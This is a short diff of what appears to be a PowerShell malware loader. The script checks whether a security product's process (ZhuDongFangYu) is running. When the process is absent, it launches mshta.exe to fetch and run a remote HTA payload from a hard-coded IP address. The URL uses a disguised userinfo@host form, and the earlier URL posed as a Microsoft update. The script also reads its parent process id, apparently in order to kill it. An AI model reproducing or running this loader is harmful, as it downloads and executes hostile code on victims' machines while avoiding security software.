@@ -4,7 +4,7 @@ $id = Get-Process -name ZhuDongFangYu* | Select-Object id | ForEach-Object -Proc
 			
 if($id -eq $null) {
 			
-	C:\Windows\SysWOW64\mshta.exe https://10.0.0.1:123@min.gitcdn.link/cdn/MicrosoftUpdate/Update_181214/6cbe241bed1f46c20f8df83a2b3bbcf6f2ffe20b/Patchx86
+	C:\Windows\SysWOW64\mshta.exe http://10.0.0.1:123@47.52.61.250:8080/foo443.hta
 	$instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
 	$cmdid = $instance.ParentProcessId
 	$killid = $null
